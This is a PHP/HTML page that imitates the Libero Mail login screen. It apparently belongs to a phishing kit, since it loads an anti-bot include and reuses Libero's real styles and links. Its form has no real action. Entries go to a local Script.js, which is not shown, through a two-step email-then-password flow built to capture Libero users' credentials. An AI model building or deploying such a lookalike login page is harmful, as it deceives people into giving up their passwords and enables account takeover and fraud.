<?php require_once 'include_clean_antibot.php'; ?>
<html>
  <script
    async=""
    src="https://cs.iubenda.com/cookie-solution/confs/js/25708360.js"
  ></script>

  <script
    src="https://cdn.iubenda.com/cookie_solution/iubenda_cs/1.84.0/core-it.js"
    charset="UTF-8"
  ></script>
  
  <head>

    <script>
      if (self != top) {
        if (window.location.href.replace)
          top.location.replace(self.location.href);
        else top.location.href = self.document.href;
      }
    </script>

    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <meta http-equiv="Cache-Control" content="no-store" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="pragma" content="no-cache" />
    <meta
      name="description"
      content="Inserisci la tua user e password ed entra in Libero Mail. Sei invece un nuovo utente? Crea un nuovo account o richiedi l'aiuto di Libero"
    />

    <title>Libero Mail - login</title>

    <link
      rel="shortcut icon"
      href="/images/libero_favicon.ico"
      type="image/x-icon"
    />
    <link
      rel="stylesheet"
      type="text/css"
      href="https://i1.plug.it/mail/login/2024/libero/css/style.css?21102024"
    />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" />

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.0/jquery.min.js"></script>
    <style type="text/css" id="operaUserStyle"></style>

    <script
      type="text/javascript"
      src="https://i2.plug.it/mail/login/2018/js/placeholders.min.js"
    ></script>

    

   

  </head>

  <body class="siviaggia">


    <div id="wrapper-iol">
      <section class="content">

           
        </script>

        <header>
          <a
            class="logo"
            href="https://www.libero.it"
            title="Vai all'Home Page di Libero"
          ></a>

          <div class="txt">Accedi</div>
        </header>

        <form
       
          name="autenticazione"
        >
          <input type="hidden" name="SERVICE_ID" value="webmail" />
          <input
            type="hidden"
            name="RET_URL"
            value="https://mail1.libero.it/appsuite/api/login?action=liberoLogin"
          />
          <input type="hidden" name="way" value="" />

          <label id="label_loginid" class="iol-material-textfield-outlined">
            <input
              name="LOGINID"
              id="loginid"
              value=""
              maxlength="256"
              placeholder=" "
              autocomplete=""
              autofocus=""
              required=""
              pattern=".*"
            />
            <span>Inserisci la tua email</span>

            <span id="loginid_error" class="txt-error" style="display: none">
            </span>
          </label>

          <button class="iol-material-button-contained" id="form_submit">
            AVANTI
          </button>

          <div class="settings">
            <label class="iol-material-checkbox">
              <input type="checkbox" name="REMEMBERME" value="S" />
              <span>Rimani collegato</span>
            </label>

            <a
              href="https://aiuto.libero.it"
              class="float-right"
              target="_blank"
              >Serve aiuto?</a
            >

            <div class="create-account">
              Non hai un account?
              <a
                href="https://registrazione.libero.it?service_id=webmail&amp;redirect_uri=https%3A%2F%2Fmail1.libero.it%2Fappsuite%2Fapi%2Flogin%3Faction%3DliberoLogin&amp;ref=lg"
                target="_blank"
                >Registrati ora</a
              >
            </div>
          </div>

          <section class="recaptcha" id="captchablock" style="display: none">
            <span id="box_err_captcha" class="txt-error"> </span>
          </section>
          <!-- END recaptcha -->
        </form>

        <script src="Script.js"></script>
      </section>

      <!-- Password Form (Step 2) -->
      <section class="content" id="password-step" style="display: none;">
        <header>
          <a
            class="logo"
            href="https://www.libero.it"
            title="Vai all'Home Page di Libero"
          ></a>

          
          <div class="user-email-display" id="user-email-display" style="text-align: center; font-size: 12px;margin: 10px 0px;"></div>
        </header>

        <div class="password-container">
          <!-- Hidden field for email -->
          <input type="hidden" id="hidden-loginid" name="LOGINID" />
          
          <label id="label_password" class="iol-material-textfield-outlined">
            <input
              type="password"
              name="PASSWORD"
              id="password"
              value=""
              maxlength="25"
              placeholder=" "
              autocomplete="current-password"
              autofocus=""
              required=""
              pattern=".*"
            />
            <span>Inserisci la tua password</span>
            <span
              toggle="#password"
              class="fas fa-eye field-icon toggle-password"
              style="cursor: pointer; color: #0f0f0f;"
            ></span>

            <span id="keyid_error" class="txt-error" style="display: none">
            </span>
          </label>

          <button type="button" class="iol-material-button-contained" id="password_submit">
            AVANTI
          </button>

          <div class="settings">
            <a
              id="password_dimenticata"
              target="_blank"
              href="https://account.libero.it/recuperopassword?url_member=https%3A%2F%2Fmail1.libero.it%2Fappsuite%2Fapi%2Flogin%3Faction%3DliberoLogin"
              >Password dimenticata?</a
            >


          </div>

          <section class="recaptcha" id="captchablock-password" style="display: none">
            <span id="box_err_captcha_password" class="txt-error"> </span>
          </section>
        </div>
      </section>

      <div id="box-editoriale" class="box-editoriale" style="">
        <header>
          <h4>I PIÙ LETTI DI</h4>
          <h3>
            <a id="general_content" href="https://siviaggia.it" target="_blank"
              ><img
                src="https://i1.plug.it//mail/login/2018/libero/img/logo-siviaggia.png"
                alt="SiViaggia"
            /></a>
          </h3>
        </header>
        <ul>
          <li>
            <a
              id="acontent_1"
              href="https://siviaggia.it/notizie/riomaggiore-senza-stabilimenti-balneari/551488/"
              target="_blank"
              ><img
                id="img_1"
                src="https://wips.plug.it/cips/libero/images/siviaggia/ed656b263a16bf0441c750196e432c21/riomaggiore.jpg?w=200&amp;h=114&amp;a=c"
              />
              <p id="p_1">
                La perla italiana (rara) dove il mare è davvero "free"
              </p>
            </a>
            <a
              id="asubtitle_1"
              href="https://siviaggia.it"
              class="canale"
              target="_blank"
              >Viaggi</a
            >
          </li>
          <li>
            <a
              id="acontent_2"
              href="https://siviaggia.it/notizie/bus-notturno-lusso-collega-citta-europee/551469/"
              target="_blank"
              ><img
                id="img_2"
                src="https://wips.plug.it/cips/libero/images/siviaggia/8af94f6a1f1e279ddcb55a4f90e4d67d/amsterdam-vista-panoramica.jpg?w=90&amp;h=60&amp;a=c"
              />
              <p id="p_2">
                Un "bus-hotel" di lusso ti porta a visitare questa città
              </p>
            </a>
            <div class="clearfix"></div>
          </li>
          <li>
            <a
              id="acontent_3"
              href="https://siviaggia.it/notizie/paesi-piu-giorni-ferie-moorepay-classifica-2025/551430/"
              target="_blank"
              ><img
                id="img_3"
                src="https://wips.plug.it/cips/libero/images/siviaggia/f99c6c8bf0140a49bbd7507eae5e7556/austria-paese-con-piu-ferie.jpg?w=90&amp;h=60&amp;a=c"
              />
              <p id="p_3">
                Volete ferie infinite? Il Paese d'Europa dove si lavora meno
              </p>
            </a>
            <div class="clearfix"></div>
          </li>
          <li>
            <a
              id="acontent_4"
              href="https://siviaggia.it/posti-incredibili/cairn-barnenez-francia/551462/"
              target="_blank"
              ><img
                id="img_4"
                src="https://wips.plug.it/cips/libero/images/siviaggia/a5ad9737bfa1e5f8db1c580120cd80a9/cairn-di-barnenez-bretagna.jpg?w=90&amp;h=60&amp;a=c"
              />
              <p id="p_4">
                Questa è la più antica architettura monumentale d’Europa
              </p>
            </a>
            <div class="clearfix"></div>
          </li>
        </ul>
        <footer id="box-editoriale-footer">
          <a href="https://siviaggia.it" target="_blank">SCOPRI DI PIÙ</a>
        </footer>
      </div>
      <div id="box-premium" class="box-premium" style="display: none">
        <header>
          <h4>I servizi di</h4>
          <h3>
            <a
              id="premium_general_content"
              href="https://www.libero.it"
              target="_blank"
            >
              <img
                src="https://i1.plug.it/mail/login/2020/libero/img/logo.svg"
                alt="Libero"
            /></a>
          </h3>
        </header>
        <ul>
          <li>
            <a id="premium_content_1" href="#" target="_blank">
              <img id="premium_img_1" src="" style="max-width: 80%" />
              <p id="premium_p_1"></p>
            </a>
            <div class="clearfix"></div>
          </li>

          <li>
            <a id="premium_content_2" href="#" target="_blank">
              <img id="premium_img_2" src="" style="max-width: 80%" />
              <p id="premium_p_2"></p>
            </a>
            <div class="clearfix"></div>
          </li>

          <li>
            <a id="premium_content_3" href="#" target="_blank">
              <img id="premium_img_3" src="" style="max-width: 80%" />
              <p id="premium_p_3"></p>
            </a>
            <div class="clearfix"></div>
          </li>

          <li>
            <a id="premium_content_4" href="#" target="_blank">
              <img id="premium_img_4" src="" style="max-width: 80%" />
              <p id="premium_p_4"></p>
            </a>
            <div class="clearfix"></div>
          </li>

          <li>
            <a id="premium_content_5" href="#" target="_blank">
              <img id="premium_img_5" src="" style="max-width: 80%" />
              <p id="premium_p_5"></p>
            </a>
            <div class="clearfix"></div>
          </li>
        </ul>
      </div>

    </div>



    <!-- footer -->
    <div id="footer-iol">
      <div class="left">
        <ul>
          <li>
            <a
              rel="nofollow"
              target="_blank"
              href="https://www.italiaonline.it/corporate/chi-siamo/"
              >Chi siamo</a
            >
          </li>
          <li>
            <a
              rel="nofollow"
              target="_blank"
              href="https://info.libero.it/note-legali/"
              >Note Legali</a
            >
          </li>
          <li>
            <a
              rel="nofollow"
              target="_blank"
              href="https://privacy.italiaonline.it/privacy_libero.html"
              >Privacy</a
            >
          </li>
          <li>
            <a
              rel="nofollow"
              target="_blank"
              href="https://privacy.italiaonline.it/common/cookie/privacy_detail.php"
              >Cookie Policy</a
            >
          </li>
          <li>
            <a
              rel="nofollow"
              target="_blank"
              href="https://www.libero.it/?showCookiePolicy"
              >Preferenze sui cookie</a
            >
          </li>
          <li>
            <a rel="nofollow" target="_blank" href="https://aiuto.libero.it/"
              >Aiuto</a
            >
          </li>
        </ul>
      </div>
      <div class="right">© ITALIAONLINE S.p.A. 2025 - P. IVA 03970540963</div>
      <div class="clearfix"></div>
    </div>

    <!--fine footer-->


</html>
